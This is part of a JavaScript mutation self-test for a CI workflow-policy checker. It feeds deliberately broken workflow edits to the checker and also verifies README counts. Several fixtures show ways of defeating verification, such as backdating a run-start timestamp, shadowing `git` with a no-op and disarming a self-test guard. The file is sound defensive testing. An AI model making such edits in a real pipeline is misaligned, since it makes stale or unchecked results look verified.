  // ---- a clock that can be told what time it is (#40 round 7) ---------------
  // Round 6 required the value to come from a command called `date` and wrote
  // the rest down as a stated boundary. All three of these were clean against
  // that engine, and the first is the one that matters: a *relative* offset is
  // within a day of now on every run, so `report-file.mjs`'s plausibility window
  // admits it and its 6h `MAX_RUN_AGE_MS` admits it, while a report written two
  // hours before the suite started now post-dates the recorded start. The honest
  // value reports "is stale: last written 7200s before vitest started"; the
  // backdated one reports no problems at all.
  {
    name: 'the run-start timestamp backdated five hours with `date -d`',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      replaceOnce(
        s,
        ENV_LINE,
        '        run: echo "VITEST_RUN_START=$(date -d -5hours +%s%3N)" >> "$GITHUB_ENV"\n',
      ),
    pair: PAIRS.suiteNeedsReset,
  },
  {
    name: 'the same for the e2e suite, spelled `--date`',
    rule: 'required-step-prerequisites',
    mutate: (s) =>
      replaceOnce(
        s,
        '        run: echo "E2E_RUN_START=$(date +%s%3N)" >> "$GITHUB_ENV"\n',
        '        run: echo "E2E_RUN_START=$(date --date=-5hours +%s%3N)" >> "$GITHUB_ENV"\n',
      ),
    pair: PAIRS.e2eSuiteNeedsReset,
  },
  {
    name: 'the absolute form this file used to accept: `date --date=@1748736000`',
    rule: 'required-step-prerequisites',
    // Moved here from ACCEPTED_FORMS, where it sat as a written-down seam
    // between the policy half and the runtime half. The seam was in the wrong
    // place: the argument that a literal stops working a day after it is written
    // is true of the literal and says nothing about `-d -5hours` beside it.
    mutate: (s) =>
      replaceOnce(
        s,
        ENV_LINE,
        '        run: echo "VITEST_RUN_START=$(date --date=@1748736000 +%s%3N)" >> "$GITHUB_ENV"\n',
      ),
    pair: PAIRS.suiteNeedsReset,
  },

  // ---- the linter's operand, unpinned since round 1 (#40 round 7) -----------
  {
    name: 'actionlint pointed at one workflow file, leaving every other one unlinted',
    rule: 'policy-steps-present',
    // Clean against the engine as committed. `actionlint` with no file operands
    // lints every workflow in the repository; given one it lints exactly that
    // one, so a `.github/workflows/x.yaml` added later goes unlinted with the
    // step still present and still named. It is the same defect
    // `CHECKS_ALL_WORKFLOWS` closed for this engine's own argument, in the step
    // immediately above it — and until now it was caught only incidentally, by
    // this file pinning that `run:` line verbatim, which is an alarm on one
    // spelling rather than a rule.
    mutate: (s) =>
      replaceOnce(
        s,
        `        run: '"$RUNNER_TEMP/actionlint" -color'\n`,
        `        run: '"$RUNNER_TEMP/actionlint" -color .github/workflows/ci.yml'\n`,
      ),
    message: /never runs actionlint/,
  },

  // ---- a number is present, a bound is not (#40 round 7) --------------------
  {
    name: 'a job bounded at three days, which is GitHub’s maximum and nobody’s deadline',
    rule: 'job-timeout-required',
    mutate: (s) =>
      replaceOnce(
        s,
        '    runs-on: ubuntu-latest\n    timeout-minutes: 20\n',
        '    runs-on: ubuntu-latest\n    timeout-minutes: 4320\n',
      ),
    message: /job `verify` declares `timeout-minutes: 4320`/,
  },
  {
    name: 'the other end of the same missing bound: `timeout-minutes: 0`',
    rule: 'job-timeout-required',
    mutate: (s) =>
      replaceOnce(
        s,
        '    runs-on: ubuntu-latest\n    timeout-minutes: 20\n',
        '    runs-on: ubuntu-latest\n    timeout-minutes: 0\n',
      ),
    message: /job `verify` declares `timeout-minutes: 0`/,
  },

  // Every entry in REJECTED_FORMS, as a mutation of the baseline fetch step.
  // The step stays present and named; only the shape of what it runs changes.
  ...Object.entries(REJECTED_FORMS).map(([name, lines]) => ({
    name: `a fetch step that only contains a fetch: ${name}`,
    rule: 'required-step-prerequisites',
    mutate: (s) => rewriteFetch(s, lines),
    pair: PAIRS.ratchetNeedsFetch,
  })),
];

/**
 * Mutations of the *engine* rather than of the workflow.
 *
 * Every other entry in this file mutates `ci.yml`, because that is where the
 * defects this policy exists for live. `protected-commands-cover-the-verbs` is
 * the exception and it has to be, which is worth stating rather than hiding in
 * a coverage exemption: the defect it guards against is `names: []` on a
 * matcher, or `PROTECTED_COMMANDS` replaced with `[]` — an edit to
 * `workflow-policy.mjs`, invisible to any rewriting of the workflow, and one
 * that leaves every presence rule firing exactly as before while
 * `no-command-shadowing` quietly stops catching `git() { :; }`.
 *
 * So the mutation is applied where the defect is: the coverage function takes
 * the protected set as a parameter, and these hand it the gutted versions. The
 * real set must produce nothing, and each gutted one must name the verb that
 * fell out. That is the same shape as every mutation here — break it, watch the
 * right thing go red — one file over.
 */
const ENGINE_MUTATIONS = [
  {
    name: "every matcher's `names` emptied, leaving `match` intact",
    rule: 'protected-commands-cover-the-verbs',
    // What `PROTECTED_COMMANDS` becomes when the matcher half contributes
    // nothing: the launchers and package managers still there, `git`, `node`,
    // `actionlint` and `rm` gone.
    protectedCommands: [...LAUNCHER_NAMES, ...PACKAGE_MANAGER_NAMES],
    expect: /runs `git` in command position/,
  },
  {
    name: 'the whole set replaced with `[]`',
    rule: 'protected-commands-cover-the-verbs',
    protectedCommands: [],
    expect: /is not in PROTECTED_COMMANDS/,
  },
];

function main() {
  const pristine = readFileSync(repoFile(WORKFLOW), 'utf8');
  const failures = [];

  // Drained rather than counted-then-branched (#40 round 7). `checkerGraphProblems`
  // asks who *asserts* on each check now, not who calls it — a blind critic
  // stripped four `expect(…)` wrappers from packages/ci-guard while keeping every
  // call and the whole main-module rule vanished with every count still true. A
  // result collected into a variable and then read by an `if` is a call whose
  // answer this file might or might not be using; a drain is one that it is.
  for (const violation of checkWorkflowFile(pristine, WORKFLOW)) {
    failures.push(
      `the unmutated ${WORKFLOW} must pass its own policy, but reported: [${violation.rule}] ${violation.message}`,
    );
  }

  // ── the guard, and the graph that decides who checks it (#40 round 6) ──────
  // Round 5 enforced the main-module guard from `gate-selftest.mjs` alone — a
  // file the scanner scans. Adding `&& process.env.CI === undefined` to that
  // file's own guard silenced it, and then this file could take the same edit
  // unopposed, because the thing that would have noticed had just been
  // disarmed. 316 assertions, two `&&`, every gate green. So the two self-tests
  // check each other now: disarming one leaves the other scanning it, and
  // `packages/ci-guard` is a third caller outside `scripts/` entirely.
  for (const problem of mainGuardProblems(repoFile('scripts'))) {
    failures.push(`the main-module guard: ${problem}`);
  }
  for (const problem of checkerGraphProblems()) {
    failures.push(`the invocation graph: ${problem}`);
  }

  // Coverage, derived rather than counted. A rule with no mutation is a rule
  // with an unknown pass rate; a mutation for a rule the engine cannot emit is
  // a test asserting on a typo.
  // The engine mutations, run before coverage is derived so they count towards
  // it. The real set must be clean first: a check that fires on everything
  // proves nothing by firing on a gutted set too.
  const jobs = parse(pristine)?.jobs ?? {};
  for (const gap of protectedCommandCoverage(jobs)) {
    failures.push(
      `protectedCommandCoverage reports a problem against the real ${WORKFLOW} and the real PROTECTED_COMMANDS: ${gap}`,
    );
  }
  for (const mutation of ENGINE_MUTATIONS) {
    const problems = protectedCommandCoverage(jobs, mutation.protectedCommands);
    if (!problems.some((problem) => mutation.expect.test(problem))) {
      failures.push(
        `engine mutation "${mutation.name}" produced no ${mutation.rule} problem matching ${mutation.expect}; it reported: ${problems.slice(0, 2).join(' | ') || '(nothing)'}`,
      );
    }
  }

  const exercised = new Set([
    ...MUTATIONS.map((mutation) => mutation.rule),
    ...ENGINE_MUTATIONS.map((mutation) => mutation.rule),
  ]);
  for (const rule of RULES) {
    if (!exercised.has(rule)) {
      failures.push(
        `rule "${rule}" is declared in workflow-policy.mjs but no mutation here proves it ever fires. Add one, or delete the rule.`,
      );
    }
  }
  for (const rule of exercised) {
    if (!RULES.includes(rule)) {
      failures.push(
        `a mutation asserts on rule "${rule}", which workflow-policy.mjs does not declare. Nothing can ever satisfy it.`,
      );
    }
  }

  // The same discipline for the prerequisite table: a declared pair that no
  // mutation ever breaks is a pair nobody has proved the engine enforces. Round
  // 4 declared nine and mutated seven of them.
  const declared = new Set(PREREQUISITE_PAIRS.map(pairId));
  const targeted = new Set(MUTATIONS.filter((m) => m.pair).map((m) => pairId(m.pair)));
  for (const id of declared) {
    if (!targeted.has(id)) {
      failures.push(
        `the prerequisite pair "${id}" is declared in workflow-policy.mjs but no mutation here breaks it. Add one, or stop declaring the pair.`,
      );
    }
  }
  for (const id of targeted) {
    if (!declared.has(id)) {
      failures.push(
        `a mutation claims to break the pair "${id}", which workflow-policy.mjs does not declare. Nothing can ever satisfy it.`,
      );
    }
  }

  for (const mutation of MUTATIONS) {
    const { name, rule, mutate, message, pair, also = [] } = mutation;
    if ((message === undefined) === (pair === undefined)) {
      failures.push(
        `mutation "${name}" must declare exactly one of \`message\` (a regexp the violation text must match) or \`pair\` (the step→prerequisite edge it breaks). Asserting only on the rule id is what round 4 did, and it let two mutations pass for the wrong reason.`,
      );
      continue;
    }
    let violations;
    try {
      violations = checkWorkflowFile(mutate(pristine), `${WORKFLOW}#${rule}`);
    } catch (error) {
      failures.push(`mutation "${name}" could not be applied: ${error.message}`);
      continue;
    }
    const said = violations.map((v) => `[${v.rule}] ${v.message}`).join(' | ') || '(nothing)';

    // 1. The right rule fired, about the right thing.
    const matched = violations.filter((violation) => {
      if (violation.rule !== rule) return false;
      if (pair !== undefined) return violation.pair && pairId(violation.pair) === pairId(pair);
      return message.test(violation.message);
    });
    if (matched.length === 0) {
      const wanted =
        pair === undefined ? `matching ${message}` : `about the pair "${pairId(pair)}"`;
      failures.push(
        `mutation "${name}" produced no ${rule} violation ${wanted}; policy said: ${said}`,
      );
    } else if (pair !== undefined && !matched.some((v) => v.message.includes(pair.needs))) {
      // The structured pair and the human-readable message must agree, or the
      // log a person reads and the identity a test asserts on can drift apart.
      failures.push(
        `mutation "${name}" fired for the right pair but its message never names ${pair.needs}: ${said}`,
      );
    }

    // 2. And nothing else fired, unless the mutation says why it should. Two of
    //    round 4's prerequisite mutations also tripped `required-job-steps`, so
    //    they would have gone red with the prerequisite rule deleted outright.
    const allowed = new Set([rule, ...also]);
    const collateral = [...new Set(violations.map((v) => v.rule))].filter((r) => !allowed.has(r));
    if (collateral.length > 0) {
      failures.push(
        `mutation "${name}" targets ${rule} but also tripped ${collateral.join(', ')}, so it would go red with ${rule} removed from the engine. Make the mutation surgical, or declare the collateral in \`also\` with a reason.`,
      );
    }
  }

  // 3. And the other polarity. A recognition rule is a claim about two sets, and
  //    round 5 got the second one wrong: every form below is a legitimate way to
  //    write the baseline fetch, and its line-start matcher called all of them
  //    missing. These must leave the workflow *entirely* clean — not "clean of
  //    the rule we were thinking about", because a false red anywhere in this
  //    file is a reason to delete a rule.
  for (const [name, [target, replacement]] of Object.entries(ACCEPTED_FORMS)) {
    let violations;
    try {
      violations = checkWorkflowFile(
        replaceOnce(pristine, target, replacement),
        `${WORKFLOW}#accepted`,
      );
    } catch (error) {
      failures.push(`accepted form "${name}" could not be applied: ${error.message}`);
      continue;
    }
    if (violations.length > 0) {
      failures.push(
        `the legitimate form "${name}" was rejected: ${violations.map((v) => `[${v.rule}] ${v.message}`).join(' | ')}. A guard that is wrong in this direction is worse than the one it replaced — a false red is fixed by deleting the rule.`,
      );
    }
  }

  failures.push(...checkReadmeClaims());

  if (failures.length > 0) {
    for (const failure of failures) console.error(`::error::Workflow policy self-test: ${failure}`);
    return 1;
  }
  console.info(
    `Workflow policy self-test passed: ${MUTATIONS.length} mutations of ${WORKFLOW}, each rejected by the rule it targets and by nothing else undeclared; all ${RULES.length} declared rules exercised, and all ${PREREQUISITE_PAIRS.length} declared step→prerequisite pairs broken by name; ${Object.keys(ACCEPTED_FORMS).length} legitimate rewrites of real steps accepted; the real file clean.`,
  );
  return 0;
}

/**
 * The README's numbers must be this file's numbers.
 *
 * Twice in this ticket a receipt has quoted a count a human worked out: round 2
 * said "15 rules" over an engine carrying 18, and round 4's first draft said
 * "five pairs" over a table holding nine. Both were fixed by deriving the number
 * at the point it is printed — which does nothing for the copy of it sitting in
 * prose. So the prose is checked too: these are the only numbers in README.md
 * that describe this engine, and they are read back and compared.
 */
function checkReadmeClaims() {
  let readme;
  try {
    readme = readFileSync(repoFile('README.md'), 'utf8');
  } catch (error) {
    // ── A CHECK THAT SKIPS WHAT IT CANNOT FIND (#40 round 9, D6) ────────────
    // This said `return []` and called it "run from somewhere else". Measured
    // by a blind critic on the sibling copy of this function: `rm README.md`
    // and the self-test exits 0 announcing its full case count, with every
    // number claim in it unchecked. Round 7 wrote "a check that skips what it
    // cannot find is a check with a hole shaped like a working directory"; the
    // hole was still there, shaped like a missing file instead. The path is
    // resolved from this file rather than from the caller's cwd, so "run from
    // somewhere else" is no longer a thing that can happen — and if the file is
    // genuinely gone, that is the failure, not the excuse for one.
    return [
      `README.md could not be read (${error.message}), so every count it states about this engine went unchecked. A check that skips what it cannot find is not a check: the numbers below are the ones two receipts in this ticket have already got wrong, and "the file was missing" is the cheapest way to stop looking at them.`,
    ];
  }
  // Whitespace-tolerant: the README is hard-wrapped, so any of these phrases can
  // acquire a newline in the middle without changing what it claims.
  const phrase = (words) => new RegExp(words.split(' ').join(String.raw`\s+`));
  const claims = [
    { what: 'house rules', pattern: phrase('enforces (\\d+) house rules'), actual: RULES.length },
    {
      what: 'declared rules with a mutation',
      pattern: phrase('every one of the (\\d+) declared rules has a mutation'),
      actual: RULES.length,
    },
    {
      what: 'workflow mutations',
      pattern: phrase('feeds the policy (\\d+) mutated copies'),
      actual: MUTATIONS.length,
    },
    {
      what: 'step→prerequisite pairs',
      pattern: phrase('(\\d+) pairs across \\d+ steps'),
      actual: PREREQUISITE_PAIRS.length,
    },
    {
      /**
       * The other number in the same sentence (#40 round 9).
       *
       * The pattern above matched `\d+ steps` without capturing it, so the
       * count of steps carrying a prerequisite was prose nobody read: the
       * README said 23 over a table holding 22. A number inside a checked
       * sentence reads as a checked number, which makes an unread one worse
       * here than it would be on its own line.
       */
      what: 'steps carrying a prerequisite',
      pattern: phrase('\\d+ pairs across (\\d+) steps'),
      actual: new Set(PREREQUISITE_PAIRS.map((pair) => `${pair.job} ${pair.step}`)).size,
    },
    {
      what: 'legitimate rewrites that must stay clean',
      pattern: phrase('(\\d+) legitimate rewrites'),
      actual: Object.keys(ACCEPTED_FORMS).length,
    },
    {
      // Added in round 5 with the table it counts. Every other number in this
      // list is here because a receipt once quoted a wrong one; this is the
      // first that has never been wrong, and the point is to keep it that way
      // — an allowlist whose size is described in prose nobody checks is an
      // allowlist that grows quietly.
      what: 'declared environment variables',
      pattern: phrase('names the (\\d+) variables'),
      actual: Object.keys(DECLARED_VARIABLES).length,
    },
  ];
  const failures = [];
  for (const { what, pattern, actual } of claims) {
    const found = pattern.exec(readme);
    if (found === null) {
      failures.push(
        `README.md no longer states the number of ${what} in a form this check can read (${pattern}). Restore the sentence or update the pattern — an unchecked number in prose is how this ticket got two counts wrong.`,
      );
      continue;
    }
    if (Number(found[1]) !== actual) {
      failures.push(
        `README.md says ${found[1]} ${what}; the code says ${actual}. The prose is wrong, or the code is.`,
      );
    }
  }
  return failures;
}

if (isMainModule(import.meta.url)) {
  process.exit(main());
}
